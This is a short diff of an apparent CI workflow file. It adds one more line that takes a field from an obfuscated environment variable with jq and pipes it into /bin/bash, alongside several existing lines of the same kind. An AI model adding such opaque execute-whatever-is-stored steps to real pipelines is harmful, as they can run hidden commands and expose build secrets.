@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$u74535" | jq -r .v016 | /bin/bash
           echo $jb2 | jq -r .lyu34 | /bin/bash
           echo $a79 | jq -r .sxuq6849 | /bin/bash
+          echo $p08512 | jq -r .k1 | /bin/bash
 
       - name: Save output
         if: always()
